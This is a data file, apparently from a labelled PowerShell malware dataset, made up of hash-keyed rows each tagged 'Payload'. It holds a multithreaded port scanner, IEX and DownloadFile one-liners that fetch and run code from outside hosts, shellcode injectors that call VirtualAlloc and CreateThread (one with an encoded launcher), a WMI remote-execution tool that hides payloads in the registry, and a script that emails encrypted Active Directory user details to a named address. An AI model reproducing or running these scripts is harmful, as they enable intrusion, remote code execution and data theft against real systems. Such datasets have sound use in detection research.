                function Portscan-Port
                {
                    Param (
                        [Parameter(Mandatory = $True)] [String] $h
                    )

                    [string[]]$Ports = @()

                    foreach($Port in $Portlist)
                    {
                        Try
                        {
                            Test-Port -h $h -p $Port -timeout $Timeout
                        }
                        Catch
                        {
                            Write-Error ""Exception trying to scan $h port $Port""
                            Write-Error $_.Exception.Message;
                        }
                    }
                }
                [bool] $hostResult = $False

                if(!$SkipDiscovery)
                {
                    [bool] $hostResult = PortScan-Alive $thost
                    $openPorts.clear()
                    $closedPorts.clear()
                    $filteredPorts.Clear()
                }
                if((!$PingOnly) -and ($hostResult -or $SkipDiscovery))
                {
                    Portscan-Port $thost
                }
                while ($sockets.Count -gt 0) {
                    Start-Sleep -Milli 500
                }

                return @($hostResult, $openPorts, $closedPorts, $filteredPorts)
                }
            }

            
            

            [int]$saveIteration = 0
            [int]$computersDone=0
            [int]$upHosts=0
            while (($saveIteration * $SyncFreq) -lt $hostList.Count)
            {

                Get-Job | Remove-Job -Force
                $sIndex = ($saveIteration*$SyncFreq)
                $eIndex = (($saveIteration+1)*$SyncFreq)-1

                foreach ($iHost in $hostList[$sIndex..$eIndex])
                {
                    $ctr = @(Get-Job -state Running)
                    while ($ctr.Count -ge $nHosts)
                    {
                        Start-Sleep -Milliseconds $SleepTimer
                        $ctr = @(Get-Job -state Running)
                    }

                    $computersDone++
                    if(!$noProgressMeter)
                    {
                        Write-Progress -status ""Port Scanning"" -Activity $startMsg -CurrentOperation ""starting computer $computersDone""  -PercentComplete ($computersDone / $hostList.Count * 100)
                    }

                    Start-Job -ScriptBlock $portScanCode -Name $iHost -ArgumentList @($iHost, $SkipDiscovery, $PingOnly, $Timeout, $portList, $hostPortList, $Threads)  | Out-Null
                }

                Get-Job | Wait-Job | Out-Null

                foreach ($job in Get-Job)
                {
                    $jobOut = @(Receive-Job $job)
                    [bool]$hostUp = $jobOut[0]
                    $jobName = $job.Name

                    $openPorts = $jobOut[1]
                    $closedPorts = $jobOut[2]
                    $filteredPorts = $jobOut[3]

                    if($hostUp) {
                        $upHosts ++
                    }

                    if (!$quiet)
                    {
                        if($open){
                            if($openPorts){
                                $hostDate = Get-Date
                                $hostObj = New-Object System.Object
                                $hostObj | Add-Member -MemberType Noteproperty -Name Hostname -Value $jobName
                                $hostObj | Add-Member -MemberType Noteproperty -Name alive -Value $hostUp
                                $hostObj | Add-Member -MemberType Noteproperty -Name openPorts -Value $openPorts
                                $hostObj | Add-Member -MemberType Noteproperty -Name closedPorts -Value $closedPorts
                                $hostObj | Add-Member -MemberType Noteproperty -Name filteredPorts -Value $filteredPorts
                                $hostObj | Add-Member -MemberType NoteProperty -Name finishTime -Value $hostDate
                                $scannedHostList += $hostobj
                            }
                        }
                        else {
                            $hostDate = Get-Date
                            $hostObj = New-Object System.Object
                            $hostObj | Add-Member -MemberType Noteproperty -Name Hostname -Value $jobName
                            $hostObj | Add-Member -MemberType Noteproperty -Name alive -Value $hostUp
                            $hostObj | Add-Member -MemberType Noteproperty -Name openPorts -Value $openPorts
                            $hostObj | Add-Member -MemberType Noteproperty -Name closedPorts -Value $closedPorts
                            $hostObj | Add-Member -MemberType Noteproperty -Name filteredPorts -Value $filteredPorts
                            $hostObj | Add-Member -MemberType NoteProperty -Name finishTime -Value $hostDate
                            $scannedHostList += $hostobj
                        }
                    }

                    Write-PortscanOut -outhost $jobName -isUp $hostUp -openPorts $openPorts -closedPorts $closedPorts -filteredPorts $filteredPorts -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream -SkipDiscovery $SkipDiscovery
                }

                if ($grepStream) {
                    $grepStream.flush()
                }
                if ($xmlStream) {
                    $xmlStream.flush()
                }
                if($readableStream) {
                    $readableStream.flush()
                }

                $saveIteration ++
            }

            $enddate = Get-Date
            $totaltime = ($enddate - $startdate).TotalSeconds
            $endMsg = ""Port scan complete at $enddate ($totaltime seconds)""
            if (!$SkipDiscovery) {
                $endMsg += "", $upHosts hosts are up""
            }

            Write-PortscanOut -comment $endMsg -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream

            if($grepStream) {
                $grepStream.Close()
            }
            if ($xmlStream) {
                $xmlStream.Close()
            }
            if($readableStream) {
                $readableStream.Close()
            }

            return $scannedHostList

        }
        Catch
        {
            Write-Error $_.Exception.Message;
        }
    }
}
",Payload
f0af7299aaaf8a6aafda8f3b2af3e6d1aa6ec0aabd9f0cca10c9b762a27d977c,"
$wc=NeW-OBjEcT SYStEM.NeT.WEbCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadeRs.Add('User-Agent',$u);$WC.ProxY = [SySTEm.NeT.WEbReQuEsT]::DeFAuLtWebPROXY;$Wc.PROxy.CreDENTIAlS = [SyStEm.NET.CrEDenTiaLCAcHe]::DEFaUlTNETwOrKCREdENTIALS;$K='JYW>65NO~a?bMpQ}/T(e

",Payload
d9f001a517eede146eefa8c4228ed34123e67c62fe68c52dc1b0515f9c1b5b35,"
(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/power/powex.exe',""$env:TEMP\\powetfg.exe"");Start-Process (""$env:TEMP\\powetfg.exe"")

",Payload
53b6dd5d4b25b583ea9f777fb0bcb3962983cc34b490ab48522352ce8082bccc,"
$1 = '$c = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xb2,0x6f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = ""-enc "";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + ""\\syswow64\\WindowsPowerShell\\v1.0\\powershell"";iex ""& $3 $2 $e""}else{;iex ""& powershell $2 $e"";}

",Payload
eca36cecc58ea92a65d4aff18c2de4823fa68d77c9a4157e4b4f796ac0c0c067,"
IEX ((new-object net.webclient).downloadstring('http://pmlabs.net/cis/test.jpg'))

",Payload
0fd715a8ea7e95b306b1a6a91259a4ac13fbea18e6edb69be7a20069f8accfb3,"function Invoke-WmiCommand {


    [CmdletBinding()]
    Param (
        [Parameter( Mandatory = $True )]
        [ScriptBlock]
        $Payload,

        [String]
        [ValidateSet( 'HKEY_LOCAL_MACHINE',
                      'HKEY_CURRENT_USER',
                      'HKEY_CLASSES_ROOT',
                      'HKEY_USERS',
                      'HKEY_CURRENT_CONFIG' )]
        $RegistryHive = 'HKEY_CURRENT_USER',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryKeyPath = 'SOFTWARE\\Microsoft\\Cryptography\\RNG',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryPayloadValueName = 'Seed',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryResultValueName = 'Value',

        [Parameter( ValueFromPipeline = $True )]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $Impersonation,

        [System.Management.AuthenticationLevel]
        $Authentication,

        [Switch]
        $EnableAllPrivileges,

        [String]
        $Authority
    )

    BEGIN {
        switch ($RegistryHive) {
            'HKEY_LOCAL_MACHINE' { $Hive = 2147483650 }
            'HKEY_CURRENT_USER' { $Hive = 2147483649 }
            'HKEY_CLASSES_ROOT' { $Hive = 2147483648 }
            'HKEY_USERS' { $Hive = 2147483651 }
            'HKEY_CURRENT_CONFIG' { $Hive = 2147483653 }
        }

        $HKEY_LOCAL_MACHINE = 2147483650

        $WmiMethodArgs = @{}

        
        if ($PSBoundParameters['Credential']) { $WmiMethodArgs['Credential'] = $Credential }
        if ($PSBoundParameters['Impersonation']) { $WmiMethodArgs['Impersonation'] = $Impersonation }
        if ($PSBoundParameters['Authentication']) { $WmiMethodArgs['Authentication'] = $Authentication }
        if ($PSBoundParameters['EnableAllPrivileges']) { $WmiMethodArgs['EnableAllPrivileges'] = $EnableAllPrivileges }
        if ($PSBoundParameters['Authority']) { $WmiMethodArgs['Authority'] = $Authority }

        $AccessPermissions = @{
            KEY_QUERY_VALUE = 1
            KEY_SET_VALUE = 2
            KEY_CREATE_SUB_KEY = 4
            KEY_CREATE = 32
            DELETE = 65536
        }

        
        $RequiredPermissions = $AccessPermissions['KEY_QUERY_VALUE'] -bor
                               $AccessPermissions['KEY_SET_VALUE'] -bor
                               $AccessPermissions['KEY_CREATE_SUB_KEY'] -bor
                               $AccessPermissions['KEY_CREATE'] -bor
                               $AccessPermissions['DELETE']
    }

    PROCESS {
        foreach ($Computer in $ComputerName) {
            
            $WmiMethodArgs['ComputerName'] = $Computer

            Write-Verbose ""[$Computer] Creating the following registry key: $RegistryHive\\$RegistryKeyPath""
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\\default' -Class 'StdRegProv' -Name 'CreateKey' -ArgumentList $Hive, $RegistryKeyPath

            if ($Result.ReturnValue -ne 0) {
                throw ""[$Computer] Unable to create the following registry key: $RegistryHive\\$RegistryKeyPath""
            }

            Write-Verbose ""[$Computer] Validating read/write/delete privileges for the following registry key: $RegistryHive\\$RegistryKeyPath""
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\\default' -Class 'StdRegProv' -Name 'CheckAccess' -ArgumentList $Hive, $RegistryKeyPath, $RequiredPermissions

            if (-not $Result.bGranted) {
                throw ""[$Computer] You do not have permission to perform all the registry operations necessary for Invoke-WmiCommand.""
            }

            $PSSettingsPath = 'SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell'
            $PSPathValueName = 'Path'

            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKEY_LOCAL_MACHINE, $PSSettingsPath, $PSPathValueName

            if ($Result.ReturnValue -ne 0) {
                throw ""[$Computer] Unable to obtain powershell.exe path from the following registry value: HKEY_LOCAL_MACHINE\\$PSSettingsPath\\$PSPathValueName""
            }

            $PowerShellPath = $Result.sValue
            Write-Verbose ""[$Computer] Full PowerShell path: $PowerShellPath""

            $EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

            Write-Verbose ""[$Computer] Storing the payload into the following registry value: $RegistryHive\\$RegistryKeyPath\\$RegistryPayloadValueName""
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $EncodedPayload, $RegistryPayloadValueName

            if ($Result.ReturnValue -ne 0) {
                throw ""[$Computer] Unable to store the payload in the following registry value: $RegistryHive\\$RegistryKeyPath\\$RegistryPayloadValueName""
            }

            
            $PayloadRunnerArgs = @""
                `$Hive = '$Hive'
                `$RegistryKeyPath = '$RegistryKeyPath'
                `$RegistryPayloadValueName = '$RegistryPayloadValueName'
                `$RegistryResultValueName = '$RegistryResultValueName'
                `n
""@

            $RemotePayloadRunner = $PayloadRunnerArgs + {
                $WmiMethodArgs = @{
                    Namespace = 'Root\\default'
                    Class = 'StdRegProv'
                }

                $Result = Invoke-WmiMethod @WmiMethodArgs -Name 'GetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryPayloadValueName

                if (($Result.ReturnValue -eq 0) -and ($Result.sValue)) {
                    $Payload = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Result.sValue))

                    $TempSerializedResultPath = [IO.Path]::GetTempFileName()

                    $PayloadResult = Invoke-Expression ($Payload)

                    Export-Clixml -InputObject $PayloadResult -Path $TempSerializedResultPath

                    $SerilizedPayloadText = [IO.File]::ReadAllText($TempSerializedResultPath)

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $SerilizedPayloadText, $RegistryResultValueName

                    Remove-Item -Path $SerilizedPayloadResult -Force

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'DeleteValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryPayloadValueName
                }
            }

            $Base64Payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RemotePayloadRunner))

            $Cmdline = ""$PowerShellPath -WindowStyle Hidden -NoProfile -EncodedCommand $Base64Payload""

            
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\\cimv2' -Class 'Win32_Process' -Name 'Create' -ArgumentList $Cmdline

            Start-Sleep -Seconds 5

            if ($Result.ReturnValue -ne 0) {
                throw ""[$Computer] Unable to execute payload stored within the following registry value: $RegistryHive\\$RegistryKeyPath\\$RegistryPayloadValueName""
            }

            Write-Verbose ""[$Computer] Payload successfully executed from: $RegistryHive\\$RegistryKeyPath\\$RegistryPayloadValueName""

            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryResultValueName

            if ($Result.ReturnValue -ne 0) {
                throw ""[$Computer] Unable retrieve the payload results from the following registry value: $RegistryHive\\$RegistryKeyPath\\$RegistryResultValueName""
            }

            Write-Verbose ""[$Computer] Payload results successfully retrieved from: $RegistryHive\\$RegistryKeyPath\\$RegistryResultValueName""

            $SerilizedPayloadResult = $Result.sValue

            $TempSerializedResultPath = [IO.Path]::GetTempFileName()

            Out-File -InputObject $SerilizedPayloadResult -FilePath $TempSerializedResultPath
            $PayloadResult = Import-Clixml -Path $TempSerializedResultPath

            Remove-Item -Path $TempSerializedResultPath

            $FinalResult = New-Object PSObject -Property @{
                PSComputerName = $Computer
                PayloadOutput = $PayloadResult
            }

            Write-Verbose ""[$Computer] Removing the following registry value: $RegistryHive\\$RegistryKeyPath\\$RegistryResultValueName""
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\\default' -Class 'StdRegProv' -Name 'DeleteValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryResultValueName

            Write-Verbose ""[$Computer] Removing the following registry key: $RegistryHive\\$RegistryKeyPath""
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\\default' -Class 'StdRegProv' -Name 'DeleteKey' -ArgumentList $Hive, $RegistryKeyPath

            return $FinalResult
        }
    }
}
",Payload
88d2e9f2c6e8aeb1bf6b80459179b5605614937733f39f2f7211d752df4c202b,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xd9,0x74,0x75,0xe7,0xd9,0xe9,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x6a,0x13,0x03,0x6a,0x13,0x83,0xc2,0xdd,0x96,0x80,0x1b,0x35,0xd4,0x6b,0xe4,0xc5,0xb9,0xe2,0x01,0xf4,0xf9,0x91,0x42,0xa6,0xc9,0xd2,0x07,0x4a,0xa1,0xb7,0xb3,0xd9,0xc7,0x1f,0xb3,0x6a,0x6d,0x46,0xfa,0x6b,0xde,0xba,0x9d,0xef,0x1d,0xef,0x7d,0xce,0xed,0xe2,0x7c,0x17,0x13,0x0e,0x2c,0xc0,0x5f,0xbd,0xc1,0x65,0x15,0x7e,0x69,0x35,0xbb,0x06,0x8e,0x8d,0xba,0x27,0x01,0x86,0xe4,0xe7,0xa3,0x4b,0x9d,0xa1,0xbb,0x88,0x98,0x78,0x37,0x7a,0x56,0x7b,0x91,0xb3,0x97,0xd0,0xdc,0x7c,0x6a,0x28,0x18,0xba,0x95,0x5f,0x50,0xb9,0x28,0x58,0xa7,0xc0,0xf6,0xed,0x3c,0x62,0x7c,0x55,0x99,0x93,0x51,0x00,0x6a,0x9f,0x1e,0x46,0x34,0x83,0xa1,0x8b,0x4e,0xbf,0x2a,0x2a,0x81,0x36,0x68,0x09,0x05,0x13,0x2a,0x30,0x1c,0xf9,0x9d,0x4d,0x7e,0xa2,0x42,0xe8,0xf4,0x4e,0x96,0x81,0x56,0x06,0x5b,0xa8,0x68,0xd6,0xf3,0xbb,0x1b,0xe4,0x5c,0x10,0xb4,0x44,0x14,0xbe,0x43,0xab,0x0f,0x06,0xdb,0x52,0xb0,0x77,0xf5,0x90,0xe4,0x27,0x6d,0x31,0x85,0xa3,0x6d,0xbe,0x50,0x59,0x6b,0x28,0x7e,0x82,0xe9,0x7b,0xe8,0xb8,0x0d,0x7a,0x29,0x35,0xeb,0x2c,0xf9,0x16,0xa4,0x8c,0xa9,0xd6,0x14,0x64,0xa0,0xd8,0x4b,0x94,0xcb,0x32,0xe4,0x3e,0x24,0xeb,0x5c,0xd6,0xdd,0xb6,0x17,0x47,0x21,0x6d,0x52,0x47,0xa9,0x82,0xa2,0x09,0x5a,0xee,0xb0,0xfd,0xaa,0xa5,0xeb,0xab,0xb5,0x13,0x81,0x53,0x20,0x98,0x00,0x04,0xdc,0xa2,0x75,0x62,0x43,0x5c,0x50,0xf9,0x4a,0xc8,0x1b,0x95,0xb2,0x1c,0x9c,0x65,0xe5,0x76,0x9c,0x0d,0x51,0x23,0xcf,0x28,0x9e,0xfe,0x63,0xe1,0x0b,0x01,0xd2,0x56,0x9b,0x69,0xd8,0x81,0xeb,0x35,0x23,0xe4,0xed,0x0a,0xf2,0xc0,0x9b,0x62,0xc6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
2d63dc5905e6fde17249d26e140131f67ddb54c1388b66f19a9740d93123888f,"
$path = [Environment]::GetFolderPath(""ApplicationData"") + ""\\nsm.txt""

If (Test-Path $path)
{
    Exit
}


$sertifikat = [Byte[]] (48,130,4,132,2,1,3,48,130,4,74,6,9,42,134,72,134,247,13,1,7,1,160,130,4,59,4,130,4,55,48,130,4,51,48,130,4,47,6,9,42,134,72,134,247,13,1,7,6,160,130,4,32,48,130,4,28,2,1,0,48,130,4,21,6,9,42,134,72,134,247,13,1,7,1,48,28,6,10,42,134,72,134,247,13,1,12,1,6,48,14,4,8,8,55,101,195,42,247,132,164,2,2,8,0,128,130,3,232,104,55,217,204,104,218,227,125,163,154,120,234,44,187,208,199,244,99,47,234,174,89,215,106,68,64,102,97,198,101,81,34,169,161,26,173,27,183,250,180,143,37,169,0,70,237,171,124,68,124,41,146,106,120,150,94,209,17,37,127,43,70,57,255,161,199,117,67,240,230,93,140,166,250,14,18,151,241,213,118,201,245,177,249,87,255,220,210,107,87,199,190,104,129,222,6,61,252,6,188,221,211,154,108,238,211,11,56,147,119,247,244,239,116,56,47,184,164,14,151,2,38,238,103,142,184,229,14,64,249,91,77,68,171,22,58,78,109,172,109,92,3,74,162,110,234,38,75,200,14,229,15,80,158,117,19,95,100,103,37,77,188,203,57,118,245,124,18,173,164,99,220,152,35,123,230,198,168,224,95,12,205,161,199,109,195,35,176,223,113,156,165,198,36,249,194,142,51,147,237,7,138,58,180,74,129,199,146,73,132,4,12,126,242,193,121,189,87,155,191,18,187,239,90,147,228,49,148,174,188,183,39,62,81,130,237,229,215,41,255,165,157,90,121,98,208,17,84,80,77,146,194,132,20,233,85,207,56,95,102,109,101,169,123,30,239,11,225,202,0,127,87,102,202,84,174,51,115,251,234,70,49,154,223,60,69,144,237,112,237,165,58,202,26,151,171,34,161,205,101,77,142,125,16,57,132,6,171,206,235,250,128,117,132,130,53,100,144,86,18,135,187,243,10,219,13,167,202,51,74,78,98,248,210,17,1,107,101,233,54,36,50,55,254,80,140,191,185,57,215,124,62,41,137,158,11,191,84,167,148,142,50,123,104,11,197,127,44,22,236,225,93,128,120,114,139,189,69,137,168,71,146,115,117,65,152,214,191,219,214,180,25,168,104,29,93,26,234,155,236,74,224,59,194,11,113,21,224,183,134,65,70,44,44,248,217,94,36,96,224,183,5,191,1,78,148,103,167,176,232,195,155,209,142,209,79,11,237,172,126,173,118,105,44,162,89,215,35,47,250,7,246,214,16,85,148,241,225,222,20,227,114,125,228,81,18,241,141,191,71,19,205,242,15,103,228,19,207,1,164,230,244,186,125,80,133,212,252,103,101,145,153,54,77,24,160,137,42,123,231,94,105,58,149,172,20,102,95,235,199,201,145,6,204,190,89,198,46,162,38,255,64,110,205,38,28,34,37,134,83,190,150,114,229,37,129,81,137,248,103,70,126,106,213,195,81,123,73,239,84,160,179,247,111,109,131,57,202,40,133,243,229,184,191,58,112,172,246,11,220,45,13,219,1,24,196,148,229,45,66,71,252,164,119,255,100,48,55,41,69,245,27,64,235,108,63,194,155,188,160,139,243,175,116,238,81,121,177,17,125,86,39,243,78,146,184,170,224,213,78,99,199,57,216,124,114,33,147,212,51,56,184,133,176,195,83,119,65,171,63,82,99,19,155,231,114,173,111,110,162,72,213,196,203,27,9,38,190,6,201,250,92,158,187,105,28,142,145,60,61,88,254,20,219,86,166,37,158,90,59,211,2,247,170,73,160,105,152,52,24,193,171,83,148,58,185,138,83,1,103,185,191,198,131,233,50,16,2,24,173,6,206,32,237,96,149,219,96,49,59,130,189,163,128,10,239,175,1,27,109,162,53,63,154,97,212,201,215,232,143,123,148,97,113,150,216,237,80,235,99,161,159,224,41,53,159,153,174,222,112,251,75,179,186,115,112,33,185,35,236,119,159,208,216,162,50,133,140,100,213,202,118,178,154,99,224,96,245,248,147,9,243,96,72,15,169,130,73,233,3,8,142,137,56,231,42,31,108,56,46,65,78,27,248,72,123,156,61,36,49,205,96,115,50,71,26,95,21,50,197,183,5,106,209,164,30,136,200,111,50,1,108,77,102,92,97,31,65,41,146,178,235,122,69,137,248,54,174,167,111,66,183,198,34,229,57,118,220,84,43,43,10,19,39,79,102,203,203,29,205,195,139,26,71,208,4,38,255,188,22,34,112,195,207,75,51,229,167,175,160,37,61,109,113,181,45,200,59,41,85,123,55,95,87,165,81,191,3,86,39,225,12,221,94,196,8,234,6,159,84,193,198,4,64,15,29,121,178,238,57,105,43,96,117,200,205,240,233,60,67,43,5,121,223,143,93,165,82,63,220,184,29,168,0,77,223,100,197,200,17,224,155,165,114,52,137,210,6,80,155,67,119,123,48,57,2,7,170,159,168,168,248,163,105,160,242,18,148,241,207,48,49,48,33,48,9,6,5,43,14,3,2,26,5,0,4,20,37,91,61,148,223,32,52,124,175,64,93,169,147,15,99,172,29,9,58,244,4,8,40,197,28,175,34,29,143,121,2,2,8,0)
$melding = get-aduser -identity ([Environment]::UserName) -Properties * | Select MemberOf, Company, Department, Office, physicalDeliveryOfficeName | ConvertTo-Json
$buffer = [System.Text.Encoding]::UTF8.GetBytes($melding)
$outStream = New-Object System.IO.MemoryStream

$rijndael = New-Object System.Security.Cryptography.RijndaelManaged
$rijndael.KeySize = 256
$rijndael.BlockSize = 256
$rijndael.GenerateKey()
$rijndael.GenerateIV()

$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$sertifikat)
$encKey = $cert.PublicKey.Key.Encrypt($rijndael.Key, $true)
$encIV  = $cert.PublicKey.Key.Encrypt($rijndael.IV, $true)

$cert.PrivateKey.Key

$outStream.Write($encKey, 0, 256)
$outStream.Write($encIV, 0, 256)

$e = $rijndael.CreateEncryptor()
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $e, ""Write"")

$cryptoStream.Write($buffer, 0, $buffer.Length)
$cryptoStream.Dispose()

$base64melding = [System.Convert]::ToBase64String($outStream.ToArray())

$psemailserver = ""htca1ds1.politiet.master.net""
$smtp = new-object Net.Mail.SmtpClient($psemailserver)
$smtp.Send(""anonymous@politiet.no"", ""torger.eidem@politiet.no"", ""Referat-18-06-2015"", $base64melding)


Set-Content $path """"

Echo "" ""

",Payload
4bbe2abe6160e4690cc43fad6c9caee5a447655b0ed3d3e25d9daef8359c8fbb,"
$EXRGL9 = '$cSE = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $cSE -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68